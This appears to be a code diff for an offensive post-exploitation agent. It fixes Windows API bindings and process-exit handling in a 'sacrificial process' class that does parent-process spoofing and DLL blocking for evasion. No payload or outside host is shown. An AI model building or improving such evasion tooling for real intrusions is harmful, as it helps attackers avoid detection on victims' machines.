@@ -104,11 +104,14 @@ namespace Process
             ProcessAccessFlags dwDesiredAccess,
             bool bInheritHandle,
             int dwProcessId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        [return: MarshalAs(UnmanagedType.Bool)]
         private delegate bool InitializeProcThreadAttributeList(
-            IntPtr lpAttributeList,
-            int dwAttributeCount,
-            int dwFlags,
-            ref IntPtr lpSize);
+            [In] IntPtr lpAttributeList,
+            [In] int dwAttributeCount,
+            [In] int dwFlags,
+            [In][Out] ref IntPtr lpSize);
         private delegate bool UpdateProcThreadAttribute(
             IntPtr lpAttributeList,
             uint dwFlags,
@@ -157,7 +160,7 @@ namespace Process
         private CreatePipe _pCreatePipe;
         private SetHandleInformation _pSetHandleInformation;
         private OpenProcess _pOpenProcess;
-        private InitializeProcThreadAttributeList _pInitializeProcThreadAttributeList;
+        private InitializeProcThreadAttributeList _pInitializeProcThreadAttributeList = null;
         private UpdateProcThreadAttribute _pUpdateProcThreadAttribute;
         private DeleteProcThreadAttributeList _pDeleteProcThreadAttributeList;
         private DuplicateHandle _pDuplicateHandle;
@@ -179,8 +182,8 @@ namespace Process
         {
             _pInitializeSecurityDescriptor = _agent.GetApi().GetLibraryFunction<InitializeSecurityDescriptor>(Library.ADVAPI32, "InitializeSecurityDescriptor");
             _pSetSecurityDescriptorDacl = _agent.GetApi().GetLibraryFunction<SetSecurityDescriptorDacl>(Library.ADVAPI32, "SetSecurityDescriptorDacl");
-            _pLogonUser = _agent.GetApi().GetLibraryFunction<LogonUser>(Library.ADVAPI32, "LogonUser");
-            _pCreateProcessAsUser = _agent.GetApi().GetLibraryFunction<CreateProcessAsUser>(Library.ADVAPI32, "CreateProcessAsUser");
+            _pLogonUser = _agent.GetApi().GetLibraryFunction<LogonUser>(Library.ADVAPI32, "LogonUserW");
+            _pCreateProcessAsUser = _agent.GetApi().GetLibraryFunction<CreateProcessAsUser>(Library.ADVAPI32, "CreateProcessAsUserW");
             _pCreateProcessWithLogonW = _agent.GetApi().GetLibraryFunction<CreateProcessWithLogonW>(Library.ADVAPI32, "CreateProcessWithLogonW");
             _pCreateProcessWithTokenW = _agent.GetApi().GetLibraryFunction<CreateProcessWithTokenW>(Library.ADVAPI32, "CreateProcessWithTokenW");
 
@@ -196,8 +199,8 @@ namespace Process
             _pGetExitCodeProcess = _agent.GetApi().GetLibraryFunction<GetExitCodeProcess>(Library.KERNEL32, "GetExitCodeProcess");
             _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
 
-            _pCreateEnvironmentBlock = _agent.GetApi().GetLibraryFunction<CreateEnvironmentBlock>(Library.USER32, "CreateEnvironmentBlock");
-            _pDestroyEnvironmentBlock = _agent.GetApi().GetLibraryFunction<DestroyEnvironmentBlock>(Library.USER32, "DestroyEnvironmentBlock");
+            _pCreateEnvironmentBlock = _agent.GetApi().GetLibraryFunction<CreateEnvironmentBlock>(Library.USERENV, "CreateEnvironmentBlock");
+            _pDestroyEnvironmentBlock = _agent.GetApi().GetLibraryFunction<DestroyEnvironmentBlock>(Library.USERENV, "DestroyEnvironmentBlock");
 
             Exit += SacrificialProcess_Exit;
         }
@@ -258,6 +261,7 @@ namespace Process
 
                 Marshal.WriteIntPtr(lpVal, _hParentProc);
                 int dwAttributeCount = evasionArgs.BlockDLLs ? 2 : 1;
+                
                 var result1 = _pInitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
                 _startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                 if (bRet = _pInitializeProcThreadAttributeList(_startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize))
@@ -499,6 +503,7 @@ namespace Process
                 var waitExitForever = new Task(() =>
                 {
                     _pWaitForSingleObject(Handle, 0xFFFFFFFF);
+                    OnExit(this, EventArgs.Empty);
                 });
                 stdOutTask.Start();
                 stdErrTask.Start();
@@ -509,8 +514,6 @@ namespace Process
                     stdOutTask,
                     stdErrTask
                 });
-
-                OnExit(this, EventArgs.Empty);
             });
         }
 
